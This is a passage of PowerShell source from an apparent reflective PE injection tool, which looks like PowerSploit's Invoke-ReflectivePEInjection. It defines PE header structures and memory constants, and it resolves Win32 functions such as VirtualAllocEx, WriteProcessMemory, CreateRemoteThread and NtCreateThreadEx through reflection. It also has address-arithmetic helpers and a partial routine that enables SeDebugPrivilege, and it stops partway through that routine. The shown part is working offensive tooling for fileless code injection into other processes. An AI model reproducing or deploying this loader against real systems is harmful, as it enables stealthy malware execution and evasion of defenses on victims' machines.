		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		#Struct IMAGE_BASE_RELOCATION
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		#Struct IMAGE_IMPORT_DESCRIPTOR
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		#Struct IMAGE_EXPORT_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
		
		#Struct LUID
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		#Struct LUID_AND_ATTRIBUTES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
		
		#Struct TOKEN_PRIVILEGES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}

	Function Get-Win32Functions
	{
		$Win32Functions = New-Object System.Object
		
		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
		
		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
		
		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
		
		$memsetAddr = Get-ProcAddress msvcrt.dll memset
		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
		
		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
		
		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
		
		$GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
		$GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
		
		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
		
		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
		
		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
		
		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
		
		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		$FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
		
		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
		
		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
		
		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
		
		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
		
		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
		
		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
		
		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
		
		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
		
		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
		
		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
		
		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
		
		$NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
        $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
        $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
		
		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
		
		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
		
		return $Win32Functions
	}
	#####################################

			
	#####################################
	###########    HELPERS   ############
	#####################################

	#Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
	#This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver
				#Sub bytes
				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
				
				
				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				#Add bytes
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	

	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }
	
	
	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = "EndAddress", Position = 3, Mandatory = $true)]
		[IntPtr]
		$EndAddress,
		
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
		[IntPtr]$FinalEndAddress = [IntPtr]::Zero
		if ($PsCmdlet.ParameterSetName -eq "Size")
		{
			[IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
		}
		else
		{
			$FinalEndAddress = $EndAddress
		}
		
		$PEEndAddress = $PEInfo.EndAddress
		
		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $DebugString"
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $DebugString"
		}
	}
	
	
	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)
	
		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}
	

	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    # Get a reference to System.dll in the GAC
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    # Get a reference to the GetModuleHandle and GetProcAddress methods
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	    # Get a handle to the module specified
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    # Return the address of the function
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}
	
	
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if ($Result -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				if ($Result -eq $false)
				{
					Throw "Unable to impersonate self"
				}
